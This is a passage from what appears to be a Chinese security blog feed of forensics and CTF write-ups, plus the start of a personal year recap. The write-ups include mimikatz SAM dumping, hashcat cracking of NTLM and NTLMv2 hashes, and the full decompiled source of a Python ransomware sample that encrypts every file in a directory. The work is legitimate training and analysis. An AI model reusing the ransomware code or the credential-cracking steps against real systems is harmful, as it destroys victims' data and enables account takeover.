我是卧龙</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131819402.png" alt="img"></p><h2 id="17-请问购物网站服务器的root密码是什么。（标准格式：按照实际值填写）"><a href="#17-请问购物网站服务器的root密码是什么。（标准格式：按照实际值填写）" class="headerlink" title="17.请问购物网站服务器的root密码是什么。（标准格式：按照实际值填写）"></a>17.请问购物网站服务器的root密码是什么。（标准格式：按照实际值填写）</h2><pre><code>123456</code></pre><p>直接在计算机的xshell连接记录中找到解密记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501111048332.png" alt="image-20250111104819265"></p><p>先来分析服务器 仿真起服务器 在火眼的分析结果中看到宝塔 那就进入宝塔页面 查看配置信息 发现没有数据库备份</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501132150707.png" alt="image-202501132150707"></p><p>那就先修改hosts文件 访问网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501132243344.png" alt="image-202501132243344"></p><h2 id="18-请问购物网站管理后台admin用户的密码是什么。（标准格式：按照实际值填写）"><a href="#18-请问购物网站管理后台admin用户的密码是什么。（标准格式：按照实际值填写）" class="headerlink" title="18.请问购物网站管理后台admin用户的密码是什么。（标准格式：按照实际值填写）"></a>18.请问购物网站管理后台admin用户的密码是什么。（标准格式：按照实际值填写）</h2><pre><code>longxin </code></pre><p>上面宝塔页面我们看到没有数据库备份文件 但是在上面分析计算机时可以在Document文件中找到一个miyao.js 大小为1gb 在成功建立网络映射后 在sha文件夹中可以找到一个miyao.txt 根据miyao.js的大小 猜测这是vc容器 miyao.txt就是密钥文件 使用桌面上的vc进行挂载</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501132302709.png" alt="image-202501132302709"></p><p>在其中得到了数据库的备份文件压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501132301773.png" alt="image-202501132301773"></p><p>导出这个数据库压缩包 将解压后的sql文件导入navicat中 先从宝塔中看到数据库root账户的密码为root1234</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501140038809.png" alt="image-20250114003813684"></p><p>在navicat中使用ssh隧道 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501140039774.png" alt="image-20250114003859408"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501140039635.png" alt="image-20250114003930549"></p><p>在其中新建数据库名为<code>shangcheng_com</code> 运行sql文件导入数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501140040712.png" alt="image-20250114004045634"></p><p>在sxo_admin表中找到网站后台管理员的账号和密码哈希值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501111209467.png" alt="image-20250111120934403"></p><p>直接cmd5查哈希 使用钞能力！当然使用hashcat也可以爆出来 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501111208300.png" alt="image-20250111120821233"></p><p>前面的416917是盐值 所以密码就是longxin</p><h2 id="19-该网站上架了几个支付方式"><a href="#19-该网站上架了几个支付方式" class="headerlink" title="19.该网站上架了几个支付方式"></a>19.该网站上架了几个支付方式</h2><pre><code>4</code></pre><p>第一种方法 可以直接查看数据库 这里看到五种支付方式 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501111146858.png" alt="image-20250111114635789"></p><p>但是继续往后翻 看到upd_time有一种是0 也就是说上架时间为空 因此只上架了4种支付方式</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501132341633.png" alt="image-202501132341633"></p><p>第二种方法 登陆网站后台进行查看 上面已经找到密码了 </p><p>在此之前 需要先配置一下网站的数据库文件 路径在<code>/www/wwwroot/shangcheng_com/config/database.php</code> 将账号密码改成上面我们远程连接时使用的账密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501132349715.png" alt="image-202501132349715"></p><p>成功登陆后台 同样发现四种支付方式</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501132349371.png" alt="image-202501132349371"></p><h2 id="20-该购物网站管理后台的登录地址是什么。（标准格式：-x2F-adminxx5-x3D-admin-x2F-admin-html）"><a href="#20-该购物网站管理后台的登录地址是什么。（标准格式：-x2F-adminxx5-x3D-admin-x2F-admin-html）" class="headerlink" title="20.该购物网站管理后台的登录地址是什么。（标准格式：&#x2F;adminxx5?&#x3D;admin&#x2F;admin.html）"></a>20.该购物网站管理后台的登录地址是什么。（标准格式：&#x2F;adminxx5?&#x3D;admin&#x2F;admin.html）</h2><pre><code>/adminnxp5dt.php?s=admin/logininfo.html</code></pre><p>这个可以在计算机的浏览器访问记录中找到 同时上面我们登陆的时候也能验证这个答案</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501111050799.png" alt="image-20250111105058730"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501111049391.png" alt="image-20250111104951324"></p><h2 id="21-该购物网站共上架多少商品。（标准格式：10）"><a href="#21-该购物网站共上架多少商品。（标准格式：10）" class="headerlink" title="21.该购物网站共上架多少商品。（标准格式：10）"></a>21.该购物网站共上架多少商品。（标准格式：10）</h2><pre><code>29</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501140050891.png" alt="image-20250114005000476"></p><h2 id="22-该购物网站的数据库配置的文件名是什么。（标准格式：db-php）"><a href="#22-该购物网站的数据库配置的文件名是什么。（标准格式：db-php）" class="headerlink" title="22.该购物网站的数据库配置的文件名是什么。（标准格式：db.php）"></a>22.该购物网站的数据库配置的文件名是什么。（标准格式：db.php）</h2><pre><code>database.php</code></pre><p>接第18题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501111051028.png" alt="image-20250111105119939"></p><h2 id="23-该购物网站上架的最新的商品的上架时间是什么。（标准格式：2025-01-01-11-11-11）"><a href="#23-该购物网站上架的最新的商品的上架时间是什么。（标准格式：2025-01-01-11-11-11）" class="headerlink" title="23.该购物网站上架的最新的商品的上架时间是什么。（标准格式：2025-01-01 11:11:11）"></a>23.该购物网站上架的最新的商品的上架时间是什么。（标准格式：2025-01-01 11:11:11）</h2><pre><code>2025-01-08 22:19:21</code></pre><p>时间应该是最新一件商品的最新更新时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501140053268.png" alt="image-20250114005234812"></p><h2 id="24-服务器的ssh对外端口是什么。（标准格式：22）"><a href="#24-服务器的ssh对外端口是什么。（标准格式：22）" class="headerlink" title="24.服务器的ssh对外端口是什么。（标准格式：22）"></a>24.服务器的ssh对外端口是什么。（标准格式：22）</h2><pre><code>22</code></pre><p>没什么好说的 直接命令查看</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501111051047.png" alt="image-20250111105157978"></p><h2 id="25-Java网站备份文件中配置文件（-properties）的SHA256校验值后六位是什么。（标准格式：全小写）"><a href="#25-Java网站备份文件中配置文件（-properties）的SHA256校验值后六位是什么。（标准格式：全小写）" class="headerlink" title="25.Java网站备份文件中配置文件（*.properties）的SHA256校验值后六位是什么。（标准格式：全小写）"></a>25.Java网站备份文件中配置文件（*.properties）的SHA256校验值后六位是什么。（标准格式：全小写）</h2><pre><code>de4af4</code></pre><p>查看历史记录 发现执行jar包的记录 这个jar包就是java站的配置文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501140058689.png" alt="image-20250114005854538"></p><p>找到jar包 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501140100746.png" alt="image-20250114010046596"></p><p>解压 搜索这个后缀的文件 其中application.properties就是配置文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501140102332.png" alt="image-20250114010206244"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501111011661.png" alt="image-20250111101144582"></p><h2 id="26-Java网站使用的MySQL数据库名称为（）。（标准格式：按照实际值填写）"><a href="#26-Java网站使用的MySQL数据库名称为（）。（标准格式：按照实际值填写）" class="headerlink" title="26.Java网站使用的MySQL数据库名称为（）。（标准格式：按照实际值填写）"></a>26.Java网站使用的MySQL数据库名称为（）。（标准格式：按照实际值填写）</h2><pre><code>pt</code></pre><p>在历史记录中找到备份数据库文件的操作 上面找到的pt.jar是java站的启动jar包 那这个pt就是它的数据库名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501111011698.png" alt="image-20250111101115642"></p><h2 id="27-Java网站数据库表sys-user中的用户类型为user的用户数为-。-标准格式-按照实际值填写"><a href="#27-Java网站数据库表sys-user中的用户类型为user的用户数为-。-标准格式-按照实际值填写" class="headerlink" title="27.Java网站数据库表sys_user中的用户类型为user的用户数为()。(标准格式:按照实际值填写)"></a>27.Java网站数据库表sys_user中的用户类型为user的用户数为()。(标准格式:按照实际值填写)</h2><pre><code>6</code></pre><p>我们远程连接服务器的数据库 并没有发现我们上面找到的java站的数据库pt 这个备份文件也被删掉了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501140105866.png" alt="image-20250114010533013"></p><p>好在火眼分析出数据库的记录了 去重后用户类型为user的用户应该是6个</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501140106150.png" alt="image-20250114010632020"></p><h2 id="28-请问md5值为831d75f88a50f736d3da7c929cf17580的文件名是什么。-标准格式-按照实际值填写"><a href="#28-请问md5值为831d75f88a50f736d3da7c929cf17580的文件名是什么。-标准格式-按照实际值填写" class="headerlink" title="28.请问md5值为831d75f88a50f736d3da7c929cf17580的文件名是什么。(标准格式:按照实际值填写"></a>28.请问md5值为831d75f88a50f736d3da7c929cf17580的文件名是什么。(标准格式:按照实际值填写</h2><pre><code>HDRSample.mkv</code></pre><p>没什么好办法 文件全显然后计算全部文件的md5值 在查找</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501140108986.png" alt="image-20250114010835849"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2025龙信考核比武&quot;&gt;&lt;a href=&quot;#2025龙信考核比武&quot; class=&quot;headerlink&quot; title=&quot;2025龙信考核比武&quot;&gt;&lt;/a&gt;2025龙信考核比武&lt;/h1&gt;&lt;p&gt;很奇妙的一次体验，主办方提供的检材在比赛当天凌晨发现出问题了，临时又进行更换</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>2024冀信杯决赛</title>
    <link href="http://w3nx1z1.github.io/posts/67db48b9.html"/>
    <id>http://w3nx1z1.github.io/posts/67db48b9.html</id>
    <published>2025-01-10T16:54:11.458Z</published>
    <updated>2025-02-14T08:30:17.404Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024冀信杯决赛"><a href="#2024冀信杯决赛" class="headerlink" title="2024冀信杯决赛"></a>2024冀信杯决赛</h1><p>本次比赛 我们SeeU-Sec是第一</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501082132809.png" alt="image-20250108213232049"></p><p>在这里记录几道比较有意思的题目 赛制分成三部分：安全运维、应急响应、综合渗透</p><p>渗透部分还是狠狠的败北了 只做了一个后台的密码爆破和sql报错注入 分数的大头还是在应急和安全运维部分</p><h2 id="日志和注册表分析"><a href="#日志和注册表分析" class="headerlink" title="日志和注册表分析"></a>日志和注册表分析</h2><p>题目具体是什么记得不是很清楚了 大概意思好像是存在一个攻击者创建后门用户的行为 需要找到创建的这个用户和密码</p><p>首先给到的是一个evtx的windows日志文件 直接用windows默认的日志工具打开也行 但是不是很方便检索</p><p>可以先用<code>Win_logs_parse_tool</code>工具把evtx文件提取成xml文件和html文件 转化之后如图</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501082337072.png" alt="image-20250108233723827"></p><p>根据windows的事件ID 4720对应的事件是windows创建用户的 直接搜索这个id 找到对应的事件记录 可以在事件详情中找到创建的账户名称 是<code>2Ha0c2K34ruiop$</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501082339423.png" alt="image-20250108233934353"></p><p>使用这个用户名可以解压附件中的SAM.zip 注册表文件压缩包  里面有三个注册表文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501090011304.png" alt="image-20250109001117203"></p><p>我们通过注册表可以获取windows用户密码的哈希值 但是不能直接拿到明文</p><p>只需要sam和system这两个注册表 利用mimikatz就可以进行提取</p><pre><code>mimikatz # lsadump::sam /sam:sam.hive /system:system.hive</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501090013140.png" alt="image-20250109001313045"></p><pre><code>RID  : 000003fb (1019)User : 2Ha0c2K34ruiop$  Hash NTLM: b4a13264d379f697fbc6d0b1a5c1fcf0</code></pre><p>题目描述中提示是6位的密码 位数不是很多 我们可以直接用hashcat进行爆破</p><pre><code>hashcat -m 1000 -a 3 b4a13264d379f697fbc6d0b1a5c1fcf0 ?a?a?a?a?a?a --show</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501090014589.png" alt="image-20250109001458512"></p><p>得到攻击者创建的账户名是<code>2Ha0c2K34ruiop$</code> 密码是<code>asdf,.</code></p><h2 id="勒索程序流量"><a href="#勒索程序流量" class="headerlink" title="勒索程序流量"></a>勒索程序流量</h2><p>流量包很长 但是没什么用好吧 直接导出http——导出需要我们分析的文件<code>lesuojiami.exe</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501090103163.png" alt="image-20250109002711194"></p><p>看到这个exe的图标 一眼是python打包的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501090103575.png" alt="image-20250109003023680"></p><p>先解包成pyc</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501090031193.png" alt="image-20250109003147001"></p><p>找到pyc文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501090103394.png" alt="image-20250109003208048"></p><p>用pycdc反编译成py文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501090033381.png" alt="image-20250109003316323"></p><p>这里是将反编译的结果保存到1.py中 后面发现这个工具好像没有把全部内容反编译出来 所以换成了decompyle3</p><p>(uncompyle6最高只支持到python3.9)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501090058967.png" alt="image-20250109005811626"></p><pre><code class="python">from Crypto.Cipher import AESimport os, sysdef get_file(_dir):    _file = []    try:        tmp = os.listdir(_dir)        print(&quot;遍历文件夹&quot; + _dir)        for i in tmp:            i = _dir + &quot;\\&quot; + i            if os.path.isdir(i):                _file += get_file(i)            else:                _file.append(i)    except:        pass    return _filedef add_to_16(par):    while len(par) % 16 != 0:        par += b&#39;\x00&#39;    return pardef jiami(b_text, b_key=&quot;zhua zhu wo!!!!&quot;.encode()):    b_key = add_to_16(b_key)    b_text = add_to_16(b_text)    mode = AES.MODE_ECB    aes = AES.new(b_key, mode)    encrypt = aes.encrypt(b_text)    return encryptdef jiami_file(_file):    try:        with open(_file, &quot;rb&quot;) as f:            content = f.read()        content = jiami(content)        with open(_file, &quot;wb&quot;) as f:            f.write(content)    except:        passdef end():    with open(__file__, &quot;wb&quot;) as f:        f.write(&quot;\n        你的重要文件已经被加密\n        &quot;.encode())program_name = sys.argv[0]_dir = os.getcwd()_file = get_file(_dir)print(program_name)_file.remove(_dir + &quot;\\&quot; + program_name)print(_file)for i in _file:    print(&quot;正在处理:&quot; + i)    jiami_file(i)    jiami_file(i)</code></pre><p>重要部分就是add_to_16函数 当密钥长度不够16的时候 使用00进行补充 </p><p>下面的<code>def jiami(b_text, b_key=&quot;zhua zhu wo!!!!&quot;.encode()):</code>告诉我们原始密钥是<code>zhua zhu wo!!!! </code> 将其转为16进制 在补位00即可</p><pre><code>7a 68 75 61 20 7a 68 75 20 77 6f 21 21 21 21 00</code></pre><p>在加密代码末尾调用了两次加密函数 我们再解密的时候也解密两次即可</p><p>附件中的重要文件文件夹中有被加密的flag压缩包 直接cyberchef进行解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501090101269.png" alt="image-20250109010158048"></p><p>再用passwarekit进行爆破密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501090102766.png" alt="image-20250109010220680"></p><p>解压得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501090103019.png" alt="image-20250109010307975"></p><h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>其实也就是一个ntlmv2哈希的爆破 但是需要我们找到密码喷洒成功的时候在流量中体现出来的特征 </p><p>首先是筛选一下smb2 看到很多记录 先提取一下ntlmv2哈希</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501110043655.png" alt="image-20250111004337505"></p><pre><code>python .\NTLMRawUnHide.py -i E:\Desktop\比赛\2024冀信杯决赛\1734843572658_410\密码喷洒.pcapng -o hash.txt </code></pre><p>可以看到结果很多 对每个账号差不多进行了101次左右的密码喷洒攻击</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501110044815.png" alt="image-20250111004433685"></p><p>直接找到最后 发现一个特征 上面这条记录是爆破失败的 在Session Setup Response后面是error 下面这条记录应该就是爆破成功的 在下面NT Status这里的值是0x00000000</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501110046852.png" alt="image-20250111004615729"></p><p>在筛选一下 看看有没有别的结果 </p><p>发现是只有这一条Session Setup Response是成功的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501110048354.png" alt="image-20250111004808219"></p><p>那就提取这一个的哈希值来进行爆破</p><pre><code>fileserver::fbi.gov:1f1bdaf788d2c102:15c26d67db4c24e8a67fea9b447c05f8:0101000000000000a8e7eb30b851db0168765147424970490000000002000600460042004900010004004400430004000e006600620069002e0067006f00760003001400640063002e006600620069002e0067006f00760005000e006600620069002e0067006f00760007000800a8e7eb30b851db0109000e0063006900660073002f00440043000000000000000000</code></pre><p>爆破出来是<code>QWEasd1234</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501110050681.png" alt="image-20250111005028612"></p><p>验证一下 当我们将这个密码输入wireshark的首选项——NTLMSSP中 发现smb3流量全部被解密了 也能证明我们爆破出的密码是正确的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501110052055.png" alt="image-20250111005240974"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024冀信杯决赛&quot;&gt;&lt;a href=&quot;#2024冀信杯决赛&quot; class=&quot;headerlink&quot; title=&quot;2024冀信杯决赛&quot;&gt;&lt;/a&gt;2024冀信杯决赛&lt;/h1&gt;&lt;p&gt;本次比赛 我们SeeU-Sec是第一&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https:</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="re" scheme="http://w3nx1z1.github.io/tags/re/"/>
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF 2024最后一战 | Misc</title>
    <link href="http://w3nx1z1.github.io/posts/5b3dd75d.html"/>
    <id>http://w3nx1z1.github.io/posts/5b3dd75d.html</id>
    <published>2025-01-08T10:00:09.647Z</published>
    <updated>2025-02-14T08:30:17.415Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTF-2024最后一战-Misc"><a href="#DASCTF-2024最后一战-Misc" class="headerlink" title="DASCTF 2024最后一战 | Misc"></a>DASCTF 2024最后一战 | Misc</h1><h2 id="弹道偏下"><a href="#弹道偏下" class="headerlink" title="弹道偏下"></a>弹道偏下</h2><p>上来打开流量包就看到有加密的SMB3流量</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501071849560.png" alt="image-20250107184942300"></p><p> 大概率是需要咱们爆破NTLMv2哈希 先用脚本提取一下 只有一个用户的哈希</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501071851667.png" alt="image-20250107185127846"></p><pre><code>share::MicrosoftAccount:0a08d9f15eb53eea:a20aec951c89961f2e81bf0917d8990a:0101000000000000cfebd19d3636db01022ada3cfbb5b30e0000000002001e004400450053004b0054004f0050002d004800440039004b0051004e00540001001e004400450053004b0054004f0050002d004800440039004b0051004e00540004001e004400450053004b0054004f0050002d004800440039004b0051004e00540003001e004400450053004b0054004f0050002d004800440039004b0051004e00540007000800cfebd19d3636db01060004000200000008003000300000000000000001000000002000004c3c615542417f8e002c772c6064cc84d886fec17c1ed7cceea68daf7f6954fc0a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100340039002e003100350035000000000000000000</code></pre><p>hashcat爆破一下</p><pre><code>hashcat -m 5600 -a 0 hash.txt rockyou.txt</code></pre><p>得到密码<code>36521478</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501071923959.png" alt="image-20250107185708255"></p><p>在流量中找到编辑——首选项——Protocols——NTLMSSP 输入上面我们爆破出的密码 发现流量成功被解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501071923212.png" alt="image-20250107185758797"></p><p>直接导出SMB 有个secret.doc </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501071858968.png" alt="image-20250107185849925"></p><p>直接打开发现是损坏的 010打开发现应该是进行了一个逆序的操作</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501071924923.png" alt="image-20250107190326296"></p><pre><code class="python">with open(&#39;secret.doc&#39;,&#39;rb&#39;) as f:   with open(&#39;1.doc&#39;,&#39;wb&#39;) as g:      g.write(f.read()[::-1])</code></pre><p>逆一下顺序 发现还是显示损坏 再看一下结构 应该是一个使用Office Word制作的文档 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501071906138.png" alt="image-20250107190631067"></p><p>我们做一个类似的doc文件 010看一下结构</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501071924751.png" alt="image-20250107191904929"></p><p>发现1.doc开头部分正好是正常doc文件的Fat表的部分 缺少的是前面OleHeader部分 那再创建一个空文件 将我们创建的正常doc文件的头部和1.doc的全部内容复制进去 就修复好了 打开发现需要密码 猜测是使用上面我们爆破出的NTLMv2密码 输入后成功打开</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501071924155.png" alt="image-20250107192307324"></p><p>修改字体颜色 找到flag</p><h2 id="1z-F0r3ns1cs-1"><a href="#1z-F0r3ns1cs-1" class="headerlink" title="1z_F0r3ns1cs_1"></a>1z_F0r3ns1cs_1</h2><pre><code>A市警方最近打击了一个涉嫌电信网络诈骗的话务窝点，并对话务窝点头目的PC进行取证。遗憾的是，嗅到风声的犯罪分子提前删除了很多犯罪证据，但由于时间仓促没有清理干净，警方的技术人员还是恢复出来一个完整的虚拟磁盘文件。这份文件似乎藏匿了一些重要的信息，你能帮助A市警方找出来吗？</code></pre><p>直接上取证大师 恢复出来两个文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501080033625.png" alt="image-20250108003330532"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501080033634.png" alt="image-20250108003343584"></p><p>使用010打开这个docx 看到有一串base64</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501080034421.png" alt="image-20250108003449364"></p><p>解一下 是个密钥</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501080036824.png" alt="image-20250108003644750"></p><pre><code>th1s_14_y0ur_key!!!!2333WHAT YOU&#39;RE GONNA DO WITH IT?</code></pre><p>再看导出的另一个文件 大小整3mb 猜测是VC容器 尝试用这个密钥进行挂载 得到三个文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501080041955.png" alt="image-20250108004157888"></p><p>脑洞来了<del>(真该死啊)</del> 这里我们先卸载掉现在挂载的容器 使用dead_end.txt对上面的VC容器进行二次挂载 里面有一个txt文档 是flag前半部分和一个掩码的提示</p><pre><code>YOU ARE AWESOME!!!!BUT NOT ENOUGH,Here is flag1:DASCTF&#123;N0w_u_knOw_H1dden_v0lum3_AND HERE IS A LITTLE REMINDER,THE MASK IS:U????KlsqONLY LOWERCASE AT 1 AND NUMBERS AT 2,3,4</code></pre><p>拿在结合第一层VC容器中的jpg文件 不难想到是需要我们进行steghide的密码爆破 </p><p>先用hashcat自带的密码生成工具maskprocessor生成字典</p><pre><code>mp64 &quot;U?l?d?d?dKlsq&quot; &gt; dictionary.txt</code></pre><p>这里的掩码代表的字符集和passwarekit都是一样的</p><p>生成字典之后 爆破就用stegseek就行了 非常快 比用sh脚本快得多</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501080049457.png" alt="image-20250108004944367"></p><p>拿到flag2</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501080050472.png" alt="image-20250108005011420"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DASCTF-2024最后一战-Misc&quot;&gt;&lt;a href=&quot;#DASCTF-2024最后一战-Misc&quot; class=&quot;headerlink&quot; title=&quot;DASCTF 2024最后一战 | Misc&quot;&gt;&lt;/a&gt;DASCTF 2024最后一战 | Misc&lt;/</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>w3nx1z1的2024年度个人总结</title>
    <link href="http://w3nx1z1.github.io/posts/90927854.html"/>
    <id>http://w3nx1z1.github.io/posts/90927854.html</id>
    <published>2024-12-31T12:34:30.170Z</published>
    <updated>2025-02-14T08:30:17.409Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024年年度总结"><a href="#2024年年度总结" class="headerlink" title="2024年年度总结"></a>2024年年度总结</h1><p>时间过得真快 距离上一次写年度总结已经过去了一年的时间 上次写的时候自己还是一个萌新，此时已经是个快退役的老赛棍了。</p><p>今年是非常特殊的一年，记录了我和社团还有我的网安学习道路上的很多第一次、很多难忘的时刻。</p><p>今年真得是参加了很多比赛，不管是线上的还是线下的，拿了不少奖，其中很多是弥补了去年的遗憾吧。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412312020383.png" alt="image-20241231202045074"></p><p>正常的警校生活可能只能允许我在有限的紧张的假期时间去探索祖国的大好河山，因此非常感谢当初的自己可以选择学习网安这条道路，在同学们只能在苦逼的校园中度日的时候，我还能一点点的去点亮地图哈哈哈，希望新的一年里可以去更多的地方。</p><p>下面一点点来回顾这一年的时光。</p><h2 id="2024-1"><a href="#2024-1" class="headerlink" title="2024.1"></a>2024.1</h2><p>还记得今年过年挺晚的 因为一些原因，刚放假就被拉去练车，当时还因为考科二没打成獬豸杯，失去一次拿奖机会哈哈哈</p><p>月底还打了西湖论剑，很遗憾的一次战斗，差一题就进了，马上这届西湖还有半个多月就要开打了，希望25年可以打到线下，真的想再去一次杭州好吧！</p><h2 id="2024-4"><a href="#2024-4" class="headerlink" title="2024.4"></a>2024.4</h2><p>铁三初赛记得是三月底打的，和20届的老学长们最后一次线下并肩作战，初赛还好，记得打到了前几名。</p><p>没想到4月底的半决赛拉了，一个学长因为要考公没来，另一个不好评价，总之很难受的一次比赛，也是第一次打awd，被爆杀QAQ。也是插个眼，希望25年的半决赛可以成功进入决赛。</p><p>这次天津之行也是见到了harder哥哥，很帅很骚，很好的man，web✌嘶哈嘶哈</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022111676.png" alt="image-20250102211116507"></p><p>同月底还打了高校管理运维赛，也是和几位学长组队，当然也是狠狠输出了，没有拖后腿。</p><p>非常难评，经过和某主办单位老师一个下午和一个晚上的battle，成功守住了华北赛区第四的成绩 <del>(第一次听说密码题不完全懂原理就不能做题 笑死)</del>  奖杯真的很帅</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412312113167.png" alt="image-20241231211339330"></p><p>还有学校的精武杯，网安这边开设的就是电子取证科目(之前也有网络攻防科目，后面不知道为什么我入学的时候就没了，打算25年开始重新启动好吧！希望后面可以发展为我校独立自主举办的比赛，到时候打算开放校外赛道，师傅们可以一起来玩呀)</p><p>和泽佬明琦一起狠狠的拿下第一，感觉取证这个东西怎么说呢，还真的有点，越老越厉害hhh</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022116471.png" alt="image-20250102211648064"></p><h2 id="2024-5"><a href="#2024-5" class="headerlink" title="2024.5"></a>2024.5</h2><p>因为因为数字中国第二次来到福建，这次是来到了福州，虽然铁三没进决赛，但是数字中国决赛的赛场就在铁三旁边哈哈哈 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412312030922.png" alt="image-20241231203058671"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412312031917.png" alt="image-20241231203105550"></p><p>也在这里见到了很多战队的师傅还有花花、骚柿子，第一次以喵帕斯的名号线下比赛 喵帕斯NB!</p><p>第一次打awdp，狠狠的爆0了 还好半决赛取证做的还好，奖项没爆0hhh</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022118989.png" alt="image-20250102211835092"></p><p>福州真的是个好地方，但是可惜我们来的这三四天里面都在下雨，到我们要走的那天晚上，在机场里发现不下了 呜呜呜 